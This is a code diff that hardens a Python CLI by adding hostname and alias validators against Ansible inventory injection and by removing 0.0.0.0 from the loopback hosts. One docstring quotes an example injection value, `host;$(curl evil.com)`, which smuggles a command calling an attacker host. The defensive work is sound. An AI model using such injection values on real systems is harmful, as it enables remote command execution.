@@ -22,6 +22,7 @@ CLI primitives only.
 
 from __future__ import annotations
 
+import re
 import sys
 from datetime import datetime, timezone
 from enum import Enum
@@ -30,6 +31,7 @@ from typing import IO, Iterable, Optional
 import typer
 
 from clawrium.cli.output import emit_error
+from clawrium.cli.output._sanitize import sanitize
 
 __all__ = [
     "OutputFormat",
@@ -40,7 +42,21 @@ __all__ = [
     "parse_kv_pairs",
     "require_flag",
     "stdin_is_tty",
+    "validate_alias",
+    "validate_hostname",
 ]
+
+
+# RFC 1123 superset: each label up to 63 chars, total up to 253. First
+# char must be alphanumeric OR `:` (to admit IPv6 literals like `::1`,
+# `2001:db8::1`). The character class explicitly excludes shell
+# metacharacters (`;`, `$`, `(`, backtick, whitespace, etc.) that would
+# enable Ansible inventory injection (ATX iter-1 B10).
+# Max total length 253 = 1 first char + up to 252 trailing.
+_HOSTNAME_RE = re.compile(r"^[a-zA-Z0-9:][a-zA-Z0-9._:-]{0,252}$")
+
+# Aliases are simpler: positive whitelist mirroring `core/names.py:validate_agent_name`.
+_ALIAS_RE = re.compile(r"^[a-zA-Z0-9_-]+$")
 
 
 class OutputFormat(str, Enum):
@@ -201,11 +217,14 @@ def now_seconds_since(iso_timestamp: Optional[str]) -> int:
     return max(0, int(delta))
 
 
-_LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1", "0.0.0.0"}
+# Loopback only — `0.0.0.0` is the wildcard bind address, not a loopback.
+# A host record stored as `0.0.0.0` should NOT skip the SSH tunnel; ATX
+# iter-1 S4 / W3 caught this.
+_LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}
 
 
 def is_local_host(hostname: Optional[str]) -> bool:
-    """Return True for loopback / wildcard / "localhost" forms.
+    """Return True for loopback / "localhost" forms.
 
     Used by `agent open` and `agent port-forward` to skip SSH tunnel
     setup when the agent runs on the same machine as the CLI.
@@ -213,3 +232,41 @@ def is_local_host(hostname: Optional[str]) -> bool:
     if not hostname:
         return False
     return hostname.strip().lower() in _LOCAL_HOSTS
+
+
+def validate_hostname(value: str, *, field: str = "hostname") -> None:
+    """Validate a hostname (or IP literal) before writing to hosts.json.
+
+    Enforces an RFC 1123-derived character class plus bidi/control-char
+    rejection. Bad values exit non-zero with `Error: invalid <field>`.
+
+    Closes ATX iter-1 B10 / W11: prevents Ansible inventory injection
+    via hostnames like `host;$(curl evil.com)` and bidi-override smuggling.
+    """
+    if not value:
+        emit_error(f"empty {field}")
+    if sanitize(value) != value:
+        emit_error(f"invalid {field} {value!r}", hint="control/bidi chars not allowed")
+    if not _HOSTNAME_RE.match(value):
+        emit_error(
+            f"invalid {field} {value!r}",
+            hint="must match RFC 1123: alphanumeric, '.', '-', up to 253 chars",
+        )
+
+
+def validate_alias(value: str) -> None:
+    """Validate an alias (RFC-1123 subset, positive whitelist).
+
+    Mirrors `core/names.py:validate_agent_name` so aliases passing this
+    check are also safe as Ansible inventory names. Closes ATX iter-1
+    W10 (alias accepted shell metacharacters).
+    """
+    if not value:
+        emit_error("empty alias")
+    if sanitize(value) != value:
+        emit_error(f"invalid alias {value!r}", hint="control/bidi chars not allowed")
+    if not _ALIAS_RE.match(value):
+        emit_error(
+            f"invalid alias {value!r}",
+            hint="must be alphanumeric, '_', or '-' only",
+        )
